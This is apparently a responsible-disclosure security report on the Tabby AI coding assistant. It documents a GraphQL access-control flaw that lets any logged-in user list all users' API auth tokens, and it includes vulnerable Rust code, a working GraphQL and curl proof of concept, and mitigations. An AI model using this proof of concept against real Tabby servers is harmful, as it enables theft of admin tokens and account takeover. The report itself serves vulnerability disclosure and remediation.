# Security Vulnerability Report: Tabby — Auth Token Exposure via GraphQL

## Summary

**Title:** Any Authenticated User Can Enumerate and Steal All Users' API Auth Tokens

**Severity:** CRITICAL (CVSS 8.8)

**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-284 (Improper Access Control)

**Affected Software:** Tabby (tabbyml/tabby), self-hosted AI coding assistant

**Fixed Version:** None (unpatched at time of report)

**Attack Vector:** Remote, authenticated (any user account, including self-registered)

**User Interaction:** None beyond having a valid user account

---

## Description

The GraphQL `users` query in Tabby exposes the `authToken` field for every user in the system and requires only basic authentication — any authenticated user, including one created via invitation-based self-registration, can enumerate all users and obtain their API auth tokens. No admin privileges are required.

The `authToken` is the API token used by the VSCode extension and IDE plugins for authenticated access to code completions, chat, and code search. Stealing it allows full impersonation of the victim, including admin users.

## Affected Files

| File | Line(s) | Issue |
|------|---------|-------|
| `ee/tabby-schema/src/schema/auth.rs` | 197 | `pub auth_token: String` exposed on `UserSecured` GraphQL type |
| `ee/tabby-schema/src/schema/mod.rs` | 342 | `users` query requires only `check_user(ctx).await?` — any authenticated user, not admin |

## Technical Details

The `UserSecured` GraphQL type publicly exposes the `auth_token` field:

```rust
// ee/tabby-schema/src/schema/auth.rs:186-207
#[derive(GraphQLObject)]
#[graphql(context = Context, impl = [UserValue])]
pub struct UserSecured {
    pub id: juniper::ID,
    pub email: String,
    pub name: String,
    pub is_admin: bool,
    pub auth_token: String,  // ← EXPOSED TO ANY AUTHENTICATED USER
    ...
}
```

The `users` query resolver requires only `check_user`, not `check_admin`:

```rust
// ee/tabby-schema/src/schema/mod.rs:334-357
async fn users(ctx: &Context, ...) -> Result<Connection<UserValue>> {
    check_user(ctx).await?;  // ← Any authenticated user, not admin
    ...
}
```

Contrast with admin mutations which consistently use `check_admin(ctx).await?`.

## Proof of Concept

**Prerequisites:** A valid user account (self-registered via invitation code).

```graphql
# Step 1: Login to obtain a session token
mutation {
  tokenAuth(email: "attacker@example.com", password: "password") {
    accessToken
  }
}

# Step 2: Enumerate all users and steal their auth tokens
query {
  users {
    edges {
      node {
        id
        email
        isAdmin
        ... on UserSecured {
          authToken
        }
      }
    }
  }
}
```

```bash
# Login
curl -X POST http://localhost:8080/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { tokenAuth(email: \"attacker@example.com\", password: \"password\") { accessToken } }"}'

# Steal all auth tokens
curl -X POST http://localhost:8080/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <accessToken>' \
  -d '{"query":"{ users { edges { node { id email isAdmin ...on UserSecured { authToken } } } } }"}'
```

**Confirmed:** A regular user account (non-admin, created via invitation) can retrieve `authToken` values for all users including admin accounts. These tokens can be used directly with the VSCode extension API.

## Impact

1. **Privilege escalation** — Regular user steals admin auth token → full admin access
2. **Account takeover** — Impersonate any user's IDE plugin session (completions, chat, code search)
3. **Data access** — Access code completion history, chat conversations, and indexed code of all users
4. **Zero detection** — Token theft is passive via a legitimate GraphQL query; no audit trail distinguishes it from normal API usage

## Mitigation

1. **Remove `auth_token` from `UserSecured` GraphQL type** — auth tokens should never be queryable via API
2. **Require `check_admin(ctx).await?` on the `users` query** — only admins should list users
3. **Or filter results** — non-admin users should only see their own record
4. **Add audit logging** — log requests that enumerate multiple users' auth tokens
5. **Rate limit** the `users` query to prevent bulk enumeration

## Disclosure Timeline

- **2026-07-25:** Vulnerability discovered during source code review
- **2026-07-25:** Proof of concept developed and verified on live instance

## Reporter

Security researcher. This finding was discovered as part of an independent security audit of AI tooling.

---

*This report is intended for responsible disclosure to the Tabby maintainers.*
